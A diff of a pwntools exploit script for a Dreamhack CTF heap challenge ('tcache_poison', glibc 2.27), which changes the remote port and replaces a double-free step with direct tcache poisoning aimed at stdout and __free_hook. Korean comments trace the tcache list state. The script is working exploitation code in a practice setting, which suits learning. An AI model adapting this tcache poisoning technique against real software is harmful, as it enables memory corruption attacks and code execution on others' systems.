@@ -1,6 +1,6 @@
 from pwn import *
 
-p = remote('host3.dreamhack.games', 22594)
+p = remote('host3.dreamhack.games', 24385)
 elf = ELF('./tcache_poison')
 libc = ELF('./libc-2.27.so')
 
@@ -34,28 +34,14 @@ allocate(0x30, b'first')
 free()  # (1)
 
 
-# tcache[0x40] : first(1) -> aaaaaaaa
+# tcache[0x40] : first(1) -> stdout -> _IO_2_1_stdout_
 # chunk : first(1)
-# (chunk + 8)에 위치하는 key를 변조해서 Double Free에 걸리지 않기 위해 b'a' 한개 더 대입
-edit(b'a'*0x8 + b'a')
-
-
-# tcache[0x40] : first(2) -> first(1) + 0x10 (동일한 청크가 tcache에 double free되는 경우 헤더를 넘어서서 0x10이 더해짐)
-# chunk : first(1)
-free()  # (2)
-# LIFO 이기 때문에 이후에 해제된 게 linked list의 헤더에 위치 (같은 first이지만, 순서를 구분하고 LIFO를 보여주기 위해 괄호에 코드의 위치인 (2) 추가)
-
-
-# tcache[0x40] : first(1) + 0x10 -> stdout -> _IO_2_1_stdout_
-# chunk : first(2)
 stdout = elf.symbols['stdout']
-allocate(0x30, p64(stdout))
-# 청크의 데이터 영역에 stdout을 대입하면 next가 stdout을 가리키게 되고,
-# stdout의 메모리에 저장된 값은 _IO_2_1_stdout_이므로 stdout의next는 다시 _IO_2_1_stdout_을 가리킴
+edit(p64(stdout) + b'a')
 
 
 # tcache[0x40] : stdout -> _IO_2_1_stdout_
-# chunk : first(1) (tcache에 들어갈 때는 동일한 청크이면 `+0x10`이 되었지만 할당될때는 또 `+0x10`이 되지 않고 그대로 동일한 청크 주소가 할당됨)
+# chunk : first(1)
 allocate(0x30, b'a')
 # 어떤 값을 대입하면서 allocate하더라도 이미 tcache에는 stdout이 링크드 리스트의 헤더(청크의 헤더X)로 존재하므로 상관없음
 
@@ -93,19 +79,9 @@ allocate(0x40, b'first')
 free()
 
 
-# tcache[0x50] : first(1) -> aaaaaaaa
+# tcache[0x50] : first(1) -> free_hook
 # chunk : first(1)
-edit(b'a'*0x8 + b'a')
-
-
-# tcache[0x50] : first(2) -> first(1) + 0x10
-# chunk : first(1)
-free()
-
-
-# tcache[0x50] : first(1) + 0x10 -> free_hook
-# chunk : first(2)
-allocate(0x40, p64(free_hook))
+edit(p64(free_hook))
 
 
 # tcache[0x50] : free_hook
